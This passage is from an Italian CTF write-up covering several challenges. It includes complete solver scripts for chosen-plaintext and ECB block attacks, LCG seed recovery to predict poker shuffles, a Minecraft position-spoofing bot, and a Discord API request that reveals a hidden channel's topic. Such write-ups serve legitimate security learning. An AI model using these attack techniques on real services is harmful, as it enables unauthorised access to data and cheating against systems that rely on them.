(M[col][j] * inv_piv) % p I[col][j] = (I[col][j] * inv_piv) % p # Eliminate this column from all other rows for r in range(n): if r == col: continue factor = M[r][col] if factor: for j in range(n): M[r][j] = (M[r][j] - factor * M[col][j]) % p I[r][j] = (I[r][j] - factor * I[col][j]) % p return I def mat_vec_mod_p(M: List[List[int]], v: List[int], p: int) -\u003e List[int]: n = len(M) out = [0] * n for i in range(n): s = 0 row = M[i] for j in range(n): s += row[j] * v[j] out[i] = s % p return out def recover_matrix_K(host: str, port: int) -\u003e List[List[int]]: K_cols = [] for i in range(N): block = bytearray(N) block[i] = 1 # e_i (mod 257) y = encrypt(host, port, bytes(block)) if len(y) != N: raise RuntimeError(\"oracle returned wrong vector length\") K_cols.append(y) # Optional progress indicator if (i + 1) % 16 == 0 or i == N - 1: print(f\"[+] collected {i + 1}/{N} columns of K\") # Convert \"list of columns\" -\u003e 2D matrix (row-major) K = [[K_cols[j][i] for j in range(N)] for i in range(N)] return K def strip_zero_padding(mbytes: bytes) -\u003e bytes: if 0 in mbytes: return mbytes[:mbytes.index(0)] return mbytes def main(): host = sys.argv[1] if len(sys.argv) \u003e= 2 else \"127.0.0.1\" port = int(sys.argv[2]) if len(sys.argv) \u003e= 3 else 12346 print(f\"[*] Target: {host}:{port}\") print(\"[*] Fetching encrypted flag...\") c_flag = get_encrypted_flag(host, port) print(\"[+] Got encrypted flag (257 integers).\") print(\"[*] Recovering encryption matrix K via 257 chosen-plaintext queries...\") K = recover_matrix_K(host, port) print(\"[+] Recovered K.\") print(\"[*] Inverting K modulo 257...\") K_inv = mat_inv_mod_p(K, P) print(\"[+] Inverted K.\") print(\"[*] Decrypting flag...\") m_vec = mat_vec_mod_p(K_inv, c_flag, P) # Sanity: we expect every coordinate to be in 0..255 (not 256) if any(x == 256 for x in m_vec): print(\"[!] Warning: found value 256 in plaintext vector; replacing with 0 for bytes().\") m_bytes = bytes((0 if x == 256 else x) for x in m_vec) m_bytes = strip_zero_padding(m_bytes) try: decoded = m_bytes.decode(\"utf-8\", errors=\"replace\") except Exception: decoded = repr(m_bytes) print(decoded) if __name__ == \"__main__\": main() Black prince Analisi La ricognizione ha mostrato una web app molto semplice con due endpoint:\n/encode: accetta un input limitato a lettere maiuscole A‚ÄìZ, cifre 0‚Äì9, parentesi graffe {} e underscore _, e restituisce una sequenza di token di quattro lettere. /flag: restituisce una lunga ‚Äúfrase‚Äù composta interamente da parole di quattro lettere (token) invece di una flag leggibile. /encode √® un encoder randomizzato che mappa ciascun carattere di input a una delle diverse possibili parole di quattro lettere. La pagina /flag √® la flag codificata usando quei token.\nUna singola passata sull‚Äôalfabeto rivela solo un sottoinsieme di token. Per decodificare /flag, dobbiamo raccogliere tutte le varianti di token presenti in /flag interrogando ripetutamente /encode con caratteri ripetuti e registrando i riscontri che corrispondono ai token visti in /flag.\nL‚Äôalfabeto consentito √® di 39 simboli (26 lettere + 10 cifre + {, }, _).\nSoluzione La strategia √®: recuperare la sequenza ordinata di token da /flag, poi inviare ripetutamente ch * N per ogni carattere consentito a /encode, registrando qualsiasi token restituito che appaia anche su /flag. Quando ogni token di /flag ha un carattere mappato, ricostruiamo la flag per sostituzione in ordine. In pratica, ripetere un carattere fa emergere pi√π varianti di token.\nScript import time import random import string from typing import Dict, List import requests import bs4 BASE_URL = 'http://168908dd.ctf.ac.upt.ro' ROUNDS = 60 REPEATS = 10 SLEEP = 0 CHARSET = string.ascii_uppercase + string.digits + '{}_' FIELD_NAME = 'text' session = requests.Session() session.headers.update({'User-Agent': 'simple-encoder-solver/1.0'}) def parse_tokens(html: str) -\u003e List[str]: soup = bs4.BeautifulSoup(html, 'html.parser') div = soup.find('div', class_='encoded') if not div: return [] return [el.get_text(strip=True) for el in div.find_all() if el.get_text(strip=True)] def get_flag_tokens() -\u003e List[str]: r = session.get(BASE_URL + '/flag', timeout=15) r.raise_for_status() return parse_tokens(r.text) def encode(text: str) -\u003e List[str]: r = session.post(BASE_URL + '/encode', data={FIELD_NAME: text}, timeout=15) r.raise_for_status() return parse_tokens(r.text) def solve() -\u003e str: flag_tokens = get_flag_tokens() if not flag_tokens: raise RuntimeError('No tokens returned from /flag') needed = set(flag_tokens) mapping: Dict[str, str] = {} for _ in range(ROUNDS): chars = list(CHARSET) random.shuffle(chars) for ch in chars: try: tokens = encode(ch * REPEATS) except Exception: continue for t in tokens: if t in needed and t not in mapping: mapping[t] = ch if SLEEP: time.sleep(SLEEP) if len(mapping) == len(needed): break decoded = ''.join(mapping.get(t, '?') for t in flag_tokens) print(f\"Mapped {len(mapping)}/{len(needed)} tokens\") return decoded if __name__ == '__main__': print(solve()) Rule of X Analisi Il servizio permette due cose:\nCifrare una storia che contiene la flag Cifrare un plaintext a scelta Welcome to The Dream of Poliphilus! 1. Get a story and a flag 2. Encrypt plaintext \u003e Cifrando alcuni plaintext, ho trovato che un blocco da 4 byte mappa sempre in un altro blocco da 4 byte (tipo ECB).\n\u003e aaaa1 Ciphertext: 46d08e66 948d0fbf \u003e aaaa Ciphertext: 46d08e66 31a3a187 \u003e 1 Ciphertext: 948d0fbf Soluzione Dato che un blocco da 4 byte mappa sempre in un altro blocco da 4 byte, per decifrare l‚Äôintero testo dovremmo inviare ogni possibile combinazione di 4 caratteri da cifrare‚Ä¶ o no?\nIn realt√†, non ci interessa l‚Äôintero testo: ci serve solo la flag. Conoscendo il formato (CTF{valoriesa}), possiamo restringere l‚Äôalfabeto da cifrare.\nArriviamo quindi a questa soluzione:\nfrom itertools import product from pwn import * from tqdm import trange context.log_level = 'critical' alphabet = 'CTF{}' + '0123456789abcdef' combs = product(alphabet, repeat=4) payload = ''.join([''.join(c) for c in combs]) output = '' blocks = [payload[i:i+4] for i in range(0, len(payload), 4)] for i in trange(0, len(blocks), 100): r = remote('28267ab8.ctf.ac.upt.ro', 9323) r.sendlineafter(b'\u003e ', b'2') r.sendlineafter(b'\u003e ',''.join(blocks[i:i+100]).encode()) r.recvline() output += r.recvline().strip().decode()[:-8] r.close() mappings = {} assert len(output) % 8 == 0, \"Encrypted output length should be a multiple of 8\" for i in range(0, len(output), 8): enc_chunk = output[i:i+8] # 8-byte ciphertext block plain_idx = i // 2 # maps to corresponding 4-byte plaintext start plain_chunk = payload[plain_idx:plain_idx+4] mappings[enc_chunk] = plain_chunk r.close() r = remote('28267ab8.ctf.ac.upt.ro', 9323) r.sendlineafter(b'\u003e ', b'1') r.recvline() flag_enc = r.recvline().strip().decode() r.close() assert len(flag_enc) % 8 == 0, \"Encrypted flag length should be a multiple of 8\" decoded_blocks = [] for i in range(0, len(flag_enc), 8): c = flag_enc[i:i+8] decoded_blocks.append(mappings.get(c, '????')) flag_dec = ''.join(decoded_blocks) print(f'Flag: {flag_dec}') Ma c‚Äô√® un problema: questo codice non riesce a estrarre l‚Äôintera flag. L‚Äôoutput √®:\n????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????F{0b3d4dd2dfa538c778f815b824da290e60ebc6d6116fcb94acc76a232fe811???????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????? Si nota l‚Äôinizio ‚ÄòF{‚Ä¶‚Äô e possiamo premettere ‚ÄòCT‚Äô, ma come ottenere l‚Äôultimo blocco?\nConsideriamo cosa contiene l‚Äôultimo blocco: 4 caratteri, i primi due sono cifre esadecimali, poi una parentesi graffa di chiusura e un carattere casuale (ecco perch√© il primo script non poteva decodificare tutto).\nSulla base di questo, possiamo forzare i due caratteri esadecimali e l‚Äôultimo carattere, estraendo cos√¨ il blocco finale della flag.\nfor tup in trange(255): for i in trange(255): if not chr(i).isprintable(): continue brute = f\"{tup:02x}\" + \"}\" + chr(i) r = remote('28267ab8.ctf.ac.upt.ro', 9323) r.sendlineafter(b'\u003e ', b'2') r.sendlineafter(b'\u003e ', brute.encode()) r.recvline() output = r.recvline().strip().decode() r.close() if output[:8] in flag_enc: print(f\"Found matching plaintext: {brute}\") exit(0) else: if tup == 0: print(output[:8]) else: print(\"No matching 4-byte plaintext found in given alphabet.\") Che produce -\u003e e7}H\nScript from itertools import product from pwn import * from tqdm import trange context.log_level = 'critical' alphabet = 'CTF{}' + '0123456789abcdef' combs = product(alphabet, repeat=4) payload = ''.join([''.join(c) for c in combs]) output = '' blocks = [payload[i:i+4] for i in range(0, len(payload), 4)] for i in trange(0, len(blocks), 100): r = remote('28267ab8.ctf.ac.upt.ro', 9323) r.sendlineafter(b'\u003e ', b'2') r.sendlineafter(b'\u003e ',''.join(blocks[i:i+100]).encode()) r.recvline() output += r.recvline().strip().decode()[:-8] r.close() mappings = {} assert len(output) % 8 == 0, \"Encrypted output length should be a multiple of 8\" for i in range(0, len(output), 8): enc_chunk = output[i:i+8] # 8-byte ciphertext block plain_idx = i // 2 # maps to corresponding 4-byte plaintext start plain_chunk = payload[plain_idx:plain_idx+4] mappings[enc_chunk] = plain_chunk r.close() r = remote('28267ab8.ctf.ac.upt.ro', 9323) r.sendlineafter(b'\u003e ', b'1') r.recvline() flag_enc = r.recvline().strip().decode() r.close() assert len(flag_enc) % 8 == 0, \"Encrypted flag length should be a multiple of 8\" decoded_blocks = [] for i in range(0, len(flag_enc), 8): c = flag_enc[i:i+8] decoded_blocks.append(mappings.get(c, '????')) flag_dec = ''.join(decoded_blocks) print(f'Flag: {flag_dec}') with open('flag.txt', 'w') as f: f.write(flag_dec + '\\n') for tup in trange(255): for i in trange(255): if not chr(i).isprintable(): continue brute = f\"{tup:02x}\" + \"}\" + chr(i) r = remote('28267ab8.ctf.ac.upt.ro', 9323) r.sendlineafter(b'\u003e ', b'2') r.sendlineafter(b'\u003e ', brute.encode()) r.recvline() output = r.recvline().strip().decode() r.close() if output[:8] in flag_enc: print(f\"Found matching plaintext: {brute}\") exit(0) else: if tup == 0: print(output[:8]) else: print(\"No matching 4-byte plaintext found in given alphabet.\") Varie üêß Full-House Poker Analisi Il gioco di poker remoto mescolava il mazzo usando un generatore lineare congruenziale (LCG) non crittografico con seed a 24 bit e Fisher‚ÄìYates. Foldando per alcune mani per raccogliere mani consecutive del giocatore, possiamo recuperare il seed (con una piccola finestra temporale o brute-force 2^24), riprodurre le mescolate future e puntare solo quando la mano prevista batte strettamente quella del dealer. Vincendo 30 volte si ottiene la flag.\nPRNG: LCG con parametri A=1103515245, C=12345, M=2^31, seed troncato a 24 bit. Shuffle: Fisher-Yates, avanzando il PRNG una volta per swap (51 estrazioni per round). Osservazione: Il giocatore riceve le prime 5 carte del mazzo mescolato; il dealer le successive 5. Attacco: Raccogliere 4 mani consecutive foldando; recuperare il seed; predire i round futuri; puntare solo su vittorie garantite; raggiungere una serie di 30. Soluzione Raccolta dati ‚Äì\u003e fold: Leggere le carte ASCII per 4 round consecutivi (HAND_SAMPLES = 4). Inviare sempre f (fold) in questa fase. Conserva la serie e garantisce una mescolata per round senza uso extra del PRNG. Recupero seed: Ricerca a finestra temporale: il seed √® derivato da time.time() modulo 2^24, assumo il timestamp vicino al momento di connessione. Partire da now \u0026 0xFFFFFF e provare raggi di 10m, 1h, 6h, 24h (~600, ~3600, ~21600, ~86400 secondi). Per ogni seed candidato, simulare HAND_SAMPLES mescolate e verificare che le prime 5 carte corrispondano alle mani osservate. Brute force completa: se fallisce, scandire tutto lo spazio a 24 bit (~16,7M seed). Fattibile in Python efficiente con early-reject. Predizione e vittoria: Dopo il recupero del seed, avanzare il PRNG eseguendo HAND_SAMPLES mescolate per sincronizzarsi col round successivo.\nPer ogni round:\nSimulare la prossima mescolata ed estrarre le 5 carte del giocatore e del dealer (posizioni 0..4 e 5..9 del mazzo). Valutare entrambe le mani con lo stesso ranking del server e confrontare. Puntare solo se la mano del giocatore batte strettamente quella del dealer; altrimenti foldare. Ripetere finch√© la serie arriva a 30; il server stampa la flag.\nScript from pwn import remote, context import re import sys import time context.log_level = 'info' HOST = '?' PORT = ? MAX_SEED = 0xFFFFFF # 24-bit HAND_SAMPLES = 4 # number of initial hands to collect for seed filtering RANK_ORDER = ['2','3','4','5','6','7','8','9','T','J','Q','K','A'] SUITS = ['‚ô†','‚ô•','‚ô¶','‚ô£'] RANK_VALUE = {r: i+2 for i, r in enumerate(RANK_ORDER)} # Build canonical ordered deck def build_deck(): return [(r,s) for r in RANK_ORDER for s in SUITS] # LCG parameters (mod 2^31) A = 1103515245 C = 12345 M = 1 \u003c\u003c 31 def lcg_next(state): return (A * state + C) \u0026 0x7fffffff # Apply Fisher-Yates using LCG state; returns new state after 51 draws and deck def shuffle_with_state(state): deck = build_deck() for i in range(len(deck)-1, 0, -1): state = lcg_next(state) j = state % (i+1) deck[i], deck[j] = deck[j], deck[i] return state, deck # Hand evaluation (same tuples ordering as server) def hand_strength(cards): ranks = sorted([RANK_VALUE[r] for (r, s) in cards], reverse=True) suits = [s for (r,s) in cards] counts = {} for rv in ranks: counts[rv] = counts.get(rv,0)+1 by_count_then_rank = sorted(counts.items(), key=lambda kv: (kv[1], kv[0]), reverse=True) is_flush = len(set(suits)) == 1 sorted_unique_desc = sorted(set(ranks), reverse=True) is_straight = False straight_high = None if len(sorted_unique_desc) == 5: top = sorted_unique_desc[0] if sorted_unique_desc == list(range(top, top-5, -1)): is_straight = True straight_high = top else: wheel = [14,5,4,3,2] if sorted_unique_desc == wheel: is_straight = True straight_high = 5 counts_sorted = [c for (_,c) in by_count_then_rank] ranks_sorted_by_count = [r for (r,_) in by_count_then_rank] if counts_sorted[0] == 4: return (7, ranks_sorted_by_count[0], ranks_sorted_by_count[1]) if counts_sorted[0] == 3 and counts_sorted[1] == 2: return (6, ranks_sorted_by_count[0], ranks_sorted_by_count[1]) if is_flush and is_straight: return (8, straight_high) if is_flush: return (5, sorted(ranks, reverse=True)) if is_straight: return (4, straight_high) if counts_sorted[0] == 3: trips_rank = ranks_sorted_by_count[0] kickers = sorted([r for r in ranks if r != trips_rank], reverse=True) return (3, trips_rank, kickers) if counts_sorted[0] == 2 and counts_sorted[1] == 2: high_pair = max(ranks_sorted_by_count[0], ranks_sorted_by_count[1]) low_pair = min(ranks_sorted_by_count[0], ranks_sorted_by_count[1]) kicker = [r for r in ranks if r != high_pair and r != low_pair][0] return (2, high_pair, low_pair, kicker) if counts_sorted[0] == 2: pair_rank = ranks_sorted_by_count[0] kickers = sorted([r for r in ranks if r != pair_rank], reverse=True) return (1, pair_rank, kickers) return (0, sorted(ranks, reverse=True)) def compare_hands(p1, p2): s1 = hand_strength(p1) s2 = hand_strength(p2) return (s1 \u003e s2) - (s1 \u003c s2) CARD_WIDTH = 7 CARD_LINES = 7 def parse_hand(block): lines = block.strip('\\n').split('\\n') # Expect 7 lines of cards if len(lines) \u003c CARD_LINES: raise ValueError('Unexpected hand block lines') line1 = lines[1] # second line (index 1) line3 = lines[3] # fourth line (index 3) parts1 = line1.split(' ') # cards separated by space parts3 = line3.split(' ') cards = [] card_regex_rank = re.compile(r'‚îÇ(.{1,2})\\s{3}‚îÇ') card_regex_suit = re.compile(r'‚îÇ\\s{2}(.)\\s{2}‚îÇ') ranks = card_regex_rank.findall(line1) suits = card_regex_suit.findall(line3) if len(ranks) != len(suits): raise ValueError('Rank/suit count mismatch') for r,s in zip(ranks,suits): cards.append((r.strip(), s)) return cards HAND_HEADER = 'Your hand:' def recv_until_hand(io): data = b'' while True: chunk = io.recvuntil(b'Action? [b]et / [f]old \u003e ', timeout=5) data += chunk text = data.decode(errors='ignore') # Extract portion between 'Your hand:' and the prompt if HAND_HEADER in text: # Get last occurrence idx = text.rfind(HAND_HEADER) after = text[idx+len(HAND_HEADER):] top_idx = after.find('‚îå') if top_idx == -1: continue hand_block = after[top_idx:] if 'Action? [b]et / [f]old \u003e' in hand_block: hand_block = hand_block.split('Action? [b]et / [f]old \u003e')[0] # Keep exactly 7 lines lines = hand_block.split('\\n')[:CARD_LINES] hand_ascii = '\\n'.join(lines) try: return parse_hand(hand_ascii) except Exception as e: context.log_level='debug' print('Parse error, retry:', e) context.log_level='info' # else keep waiting def recover_seed(hands): candidates = [] for seed in range(MAX_SEED+1): state = seed \u0026 0xffffffff ok = True for target in hands: state, deck = shuffle_with_state(state) if deck[:5] != target: ok = False break if ok: candidates.append(seed) if len(candidates) == 1: break # assume unique return candidates[0] if candidates else None def recover_seed_time_window(hands, center, radius): total = 2*radius + 1 for off in range(-radius, radius+1): seed = (center + off) \u0026 0xFFFFFF state = seed \u0026 0xffffffff ok = True for target in hands: state, deck = shuffle_with_state(state) if deck[:5] != target: ok = False break if ok: return seed return None def predict_next(state): state, deck = shuffle_with_state(state) player = deck[:5] dealer = deck[5:10] return state, player, dealer def main(): io = remote(HOST, PORT) collected = [] for i in range(HAND_SAMPLES): hand = recv_until_hand(io) print(f'[+] Round {i} observed player hand: {hand}') collected.append(hand) io.sendline(b'f') # fold to preserve streak now_seed = int(time.time()) \u0026 0xFFFFFF windows = [600, 3600, 6*3600, 24*3600] # 10m, 1h, 6h, 24h seed = None start = time.time() for rad in windows: print(f'[*] Trying seed window +/-{rad}s around 0x{now_seed:06x}...') seed = recover_seed_time_window(collected, now_seed, rad) if seed is not None: break if seed is None: print('[*] Falling back to full 2^24 brute force; this may take time') seed = recover_seed(collected) elapsed = time.time() - start if seed is None: print('[-] Seed not found') io.interactive() return print(f'[+] Seed recovered: 0x{seed:06x} in {elapsed:.2f}s') state = seed \u0026 0xffffffff for _ in range(HAND_SAMPLES): state, _deck = shuffle_with_state(state) streak = 0 target_streak = 30 round_idx = HAND_SAMPLES while streak \u003c target_streak: state, predicted_player, predicted_dealer = predict_next(state) result = compare_hands(predicted_player, predicted_dealer) action = 'b' if result \u003e 0 else 'f' print(f'[+] Predict round {round_idx}: player={predicted_player} dealer={predicted_dealer} -\u003e result={result} action={action}') # Receive actual round hand actual = recv_until_hand(io) if actual != predicted_player: print('[-] Mismatch in prediction, abort.') io.interactive() return io.sendline(action.encode()) if action == 'b': streak += 1 print(f'[+] Current streak: {streak}') round_idx += 1 io.interactive() if __name__ == '__main__': main() Grass-Guesser Analisi La challenge era un simpatico gioco in stile ‚Äúgeoguesser‚Äù in cui, da una semplice immagine d‚Äôerba, bisognava trovare dove si trovasse quell‚Äôerba nel mondo. Sarebbe impossibile, se non fosse che il sito, ogni volta che sbagliavi, ti diceva a che distanza eri dal punto reale e aggiungeva il nome della citt√† o del parco coinvolto.\nTrovare le coordinate Era possibile (come ho fatto) cercare le coordinate approssimative del luogo indicato dal sito e poi aggiustarle in modo che il sito le accettasse.\nSoluzione La soluzione √® semplice come sembra; la vera difficolt√† era trovare ogni singola coordinata, cosa che si potrebbe probabilmente automatizzare, ma ho preferito farla a mano.\nDopo aver ottenuto tutte le coordinate, le ho inviate una per una al server ottenendo la flag CTF{53575e231bf06ed00182dcc71ef0e5d1b7d6da577d04ea08add31d8fbfd53722}\nScript Questo √® lo script effettivo usato per recuperare la flag dal remoto\nimport requests, json url = '?' s = requests.Session() r = s.post(url+'api/start') sessId = json.loads(r.text)['sessionId'] lats = [51.5074,48.8566,40.7829,-33.8688,35.6762,52.5200,41.8902,37.7750,55.7558,1.2897] longs = [-0.1278,2.3521,-73.9654,151.2093,139.6503,13.4051,12.4923,-122.4194,37.6173,103.8501] for i in range(10): r = s.post(url+'api/guess', json={'sessionId': sessId, 'lat': lats[i%len(lats)], 'lng': longs[i%len(longs)]}) print(json.loads(r.text)['flag']) Discord Sanity Check Analisi La challenge non forniva alcun allegato e il solo indizio era la descrizione:\nHope you liked our original discord challenge. Now we have a better one :D\nOvviamente l‚Äôunico server Discord da analizzare era quello del CTF, con guild id 1358683641097621596.\nFatto ci√≤, il flusso per trovare la flag √® stato semplice e ha seguito questi passi:\nAprire Discord nel browser ed entrare nel server giusto Modificare con burp / gestione rete di Firefox una richiesta API. Dopodich√© ho potuto analizzare il server, ipotizzando che non fosse necessaria alcuna interazione per trovare la flag. Ho quindi aperto le API reference di Discord e iniziato ad analizzare la guild.\nRichiesta API a https://discord.com/api/v9/guilds/1358683641097621596, qui niente di interessante a parte alcuni ruoli insoliti. Richiesta API per vedere tutti i canali (alcuni potrebbero essere nascosti ma condividere comunque informazioni; √® cos√¨ che funziona Discord secondo alcuni documenti online) https://discord.com/api/v9/guilds/1358683641097621596/channels Usando l‚Äôultima richiesta sono riuscito a trovare la flag nascosta nel topic di un canale privato Stairway To Heaven Analisi La challenge diceva esplicitamente che una scala del luogo aveva un ‚Äúpezzo di stoffa‚Äù attaccato; abbiamo girato un minuto e subito dopo abbiamo trovato la flag.\nLove at first bit Analisi A parte un lungo racconto, la challenge chiedeva di trovare dove fosse stata scattata questa foto:\nDomanda strana per una misc, soprattutto perch√© la descrizione non forniva dati utili a trovare la posizione.\nAbbiamo quindi trattato l‚Äôimmagine come una challenge di steganografia e l‚Äôabbiamo analizzata con aperisolve.\nAbbiamo trovato la flag nell‚Äôanalisi zsteg come b1,rgb,lsb,xy.\nCon questo, abbiamo risolto la challenge e ottenuto la flag CTF{Palazzo Falson}.\nReverse engineering ‚öôÔ∏è Minecrafty as a Service Analisi L‚Äôallegato main.wasm √® un server Minecraft compilato in WebAssembly (WASM). Entrati nel server, si vedono due comandi disponibili: !help e !flag. Eseguendo !flag, il server risponde con qualcosa tipo: Per ottenere la flag, esegui questo comando alla posizione UwU. Questo implica che dobbiamo trovare l‚Äôesatta posizione alla quale eseguire !flag, come definita in main.wasm.\nPer localizzare l‚Äôhandler del comando, ho cercato una funzione con chat nel nome. Ho trovato github.com_go_mc_server_game.__globalChat_.Handle, che all‚Äôindirizzo 0x808c1d77 contiene l‚Äôhandler per !flag. Analizzandolo, si vede che la posizione corrente del giocatore deve essere esattamente (35246, 35246, 35246) perch√© la flag venga stampata.\n// After matching \"!flag\" int X = (int) truncS(player.posX); int Y = (int) truncS(player.posY); int Z = (int) truncS(player.posZ); // 0x89ae == 35246 if (X != 0x89ae) goto fail; if (Y != 0x89ae) goto fail; if (Z == 0x89ae) goto success; // all three must be 35246 else goto fail; Soluzione Sapendolo, dobbiamo spostarci alle coordinate (35246, 35246, 35246). Per farlo ho riutilizzato la soluzione della challenge Minecraft delle qualifiche, cambiando la posizione target.\nScript #!/usr/bin/env node const mineflayer = require('mineflayer') const { Vec3 } = require('vec3') function parseArgs () { const args = { host: '127.0.0.1', port: 25565, name: 'Flaggy', version: '1.19.4' } for (let i = 2; i \u003c process.argv.length; i++) { const a = process.argv[i] if (a === '--host') args.host = process.argv[++i] else if (a === '--port') args.port = parseInt(process.argv[++i], 10) else if (a === '--name') args.name = process.argv[++i] else if (a === '--version') args.version = process.argv[++i] } return args } const TARGET = new Vec3(35246, 35246, 35246) const MAX_STEP = 50 function stepTowards (cur, dst, maxStep) { const dx = dst.x - cur.x const dy = dst.y - cur.y const dz = dst.z - cur.z const dist = Math.sqrt(dx * dx + dy * dy + dz * dz) if (dist === 0) return cur if (dist \u003c= maxStep) return new Vec3(dst.x, dst.y, dst.z) const s = maxStep / dist return new Vec3(cur.x + dx * s, cur.y + dy * s, cur.z + dz * s) } async function main () { const { host, port, name, version } = parseArgs() console.log('[INIT] Config:', { host, port, name, version }) const createOpts = { host, port, username: name, auth: 'offline' } if (version \u0026\u0026 version.toLowerCase() !== 'auto') createOpts.version = version else console.log('[INIT] Version: auto') const bot = mineflayer.createBot(createOpts) bot.once('login', () =\u003e { console.log('[STATE] Logged in, waiting for spawn...') }) bot.once('kicked', (reason) =\u003e { console.error('[STATE] Kicked:', reason?.toString?.() || reason) }) bot.once('error', (err) =\u003e { console.error('[STATE] Error:', err) }) bot.once('end', () =\u003e { console.log('[STATE] Disconnected') }) bot.on('message', (cm) =\u003e { try { const s = cm.toString() console.log('[CHAT]', s) if (s.includes('ctf{')) { console.log(s) bot.end() process.exit(0) } } catch (_) {} }) let movementStarted = false let movementState = null let teleportReady = true function startMovement (reason) { if (movementStarted) return movementStarted = true const start = bot.entity.position.clone() console.log(`[STATE] Starting movement (${reason}) at`, { x: start.x.toFixed(2), y: start.y.toFixed(2), z: start.z.toFixed(2) }) if (bot.creative \u0026\u0026 bot.creative.startFlying) { try { bot.creative.startFlying(); console.log('[ACTION] Start flying') } catch (_) {} } let cur = start let moving = true let stepCount = 0 const interval = 200 const dist = (a, b) =\u003e Math.sqrt((a.x - b.x) ** 2 + (a.y - b.y) ** 2 + (a.z - b.z) ** 2) console.log('[MOVE] Target:', { x: TARGET.x, y: TARGET.y, z: TARGET.z }) console.log('[MOVE] Initial distance:', dist(cur, TARGET).toFixed(2), 'blocks') movementState = { cur, moving, stepCount, interval } const timer = setInterval(() =\u003e { if (!movementState.moving) return const next = stepTowards(movementState.cur, TARGET, MAX_STEP) const stepLen = dist(movementState.cur, next) const remainBefore = dist(movementState.cur, TARGET) movementState.cur = next movementState.stepCount++ console.log(`[MOVE] step ${movementState.stepCount} -\u003e (${next.x.toFixed(2)}, ${next.y.toFixed(2)}, ${next.z.toFixed(2)}) ` + `(step=${stepLen.toFixed(2)} rem=${Math.max(0, remainBefore - stepLen).toFixed(2)})`) try { bot._client.write('position', { x: next.x, y: next.y, z: next.z, onGround: true }) } catch (e1) { try { bot._client.write('position_look', { x: next.x, y: next.y, z: next.z, yaw: 0, pitch: 0, onGround: true }) } catch (e2) { console.error('[NET] Move send failed:', e2?.message || e2) } } if (next.equals(TARGET)) { movementState.moving = false clearInterval(timer) console.log('[MOVE] Arrived at target. Requesting flag...') setTimeout(() =\u003e { console.log('[CHAT] \u003e\u003e !flag') bot.chat('!flag') }, 500) } }, interval) } bot.once('spawn', () =\u003e startMovement('spawn')) bot.once('login', () =\u003e { setTimeout(() =\u003e { if (!movementStarted) { console.log('[WARN] Spawn not seen after 5s; starting anyway...') startMovement('timeout') } }, 5000) }) let debugCount = 0 bot._client.on('packet', (data, meta) =\u003e { if (debugCount \u003c 10) { console.log('[PKT]', meta.name) debugCount++ } if (meta.name === 'player_position_and_look' || meta.name === 'position' || meta.name === 'position_look' || meta.name === 'player_position') { const hasTeleportId = typeof data.teleportId === 'number' if (hasTeleportId) { try { bot._client.write('teleport_confirm', { teleportId: data.teleportId }) console.log('[NET] Confirmed teleport id', data.teleportId) } catch (e) { console.log('[NET] Teleport confirm write failed:', e?.message || e) } teleportReady = true } const hasXYZ = typeof data.x === 'number' \u0026\u0026 typeof data.y === 'number' \u0026\u0026 typeof data.z === 'number' if (hasXYZ \u0026\u0026 movementState) { movementState.cur = new Vec3(data.x, data.y, data.z) console.log('[SYNC] Cur pos updated from server packet') } if (!movementStarted) startMovement('server-position') } }) } main().catch((e) =\u003e { console.error(e) process.exit(1) }) N.B.: Questo exploit √® praticamente lo stesso di Minecrafty originale\nVolatile Analisi Analizzando il file ho capito che era un binario scritto in GO in cui la funzione main.main a 0x5309e0 costruiva un afero.MemMapFs sopra una tabella di file embedded e leggeva due path (unk_5BCEE4 -\u003e e/f1, unk_5BCEE8 -\u003e e/f2) tramite github_com_spf13_afero_ReadFile. La tabella stessa √® una slice []internal/embed/file a 0x604360, il cui header (ptr=0x604378, len=3) punta a tre voci: directory e/, e file e/f1 e e/f2. Ogni voce memorizza puntatore/lunghezza della stringa Go sia per il path sia per i dati del file, quindi dumpando le stringhe a quegli indirizzi si recuperano i payload. e/f1 era la stringa ASCII di 32 byte 6b90408b52818c16e4e3fd2e8acb40d6, mentre e/f2 conteneva un ciphertext base64 da 128 byte che iniziava con RLJwwmLd1PETlctb...PlPGI.\nContinuando nell‚Äôanalisi di main.main ho capito che chiamava encoding/base64.StdEncoding.DecodeString su e/f2, prendeva i primi 16 byte decodificati come IV, e decrittava il resto con crypto/aes.NewCipher + cipher.NewCBCDecrypter usando i byte grezzi di e/f1. Il plaintext veniva poi scritto in /uwu/flag.txt, quindi ricreare quella routine offline riproduce la flag senza eseguire il binario target.\nSoluzione Ho usato extract_embed_fs.py per parsare la slice a 0x604360 e dumpare extracted/e/f1 e extracted/e/f2 direttamente da .rodata. Lo script converte gli indirizzi virtuali in offset di file usando la base di .rodata (0x56b000) osservata in IDA, quindi niente hex-editing manuale:\ncd Downloads python extract_embed_fs.py Ho decrittato e/f2 con il flusso AES-CBC rispecchiato da main.main. decrypt_flag.py decodifica in base64 il blob, separa IV+ciphertext, decritta, rimuove il padding PKCS#7, stampa il plaintext e lo scrive dove lo avrebbe messo il binario (uwu/flag.txt):\npython decrypt_flag.py Cos√¨ si ottiene la flag come avrebbe fatto il binario.\nScript Estrazione Embed FS #!/usr/bin/env python3 from __future__ import annotations import argparse import struct from pathlib import Path RODATA_VADDR = 0x56B000 RODATA_FOFFSET = 0x16B000 FILE_SLICE_ADDR = 0x604360 FILE_ENTRY_SIZE = 48 # sizeof(string) + sizeof(string) + 16-byte hash def vaddr_to_offset(vaddr: int) -\u003e int: if vaddr \u003c RODATA_VADDR: raise ValueError(f\"virtual address 0x{vaddr:x} is outside .rodata\") return RODATA_FOFFSET + (vaddr - RODATA_VADDR) def read_slice_header(blob: bytes) -\u003e tuple[int, int, int]: if len(blob) != 24: raise ValueError(\"expected 24-byte slice header\") return struct.unpack(\"",
  "wordCount" : "9794",
  "inLanguage": "it",
  "image":"https://opengraph.githubassets.com/eccdc445364e4f9dcbece7bb7f178f0756be13a48717c78ec94bf78c35861b9a/PascalCTF/PascalCTF.github.io","datePublished": "2025-11-09T00:00:00Z",
